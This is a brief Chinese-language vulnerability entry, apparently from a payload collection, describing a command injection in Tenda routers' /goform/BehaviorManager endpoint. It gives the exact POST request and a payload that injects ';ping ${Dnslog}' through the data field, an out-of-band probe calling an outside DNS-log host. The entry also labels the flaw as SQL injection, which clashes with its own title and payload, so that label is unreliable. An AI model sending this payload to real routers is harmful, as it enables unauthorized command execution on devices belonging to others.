# 腾达路由器BehaviorManager存在命令注入漏洞

腾达路由器 ｜ SQL注入 ｜ —
- **请求**：`POST /goform/BehaviorManager HTTP/1.1`

**Payload**
```
modulename=macfilter&option=add&switch=0&data=%3Bping+${Dnslog}$
```
- **响应特征**：200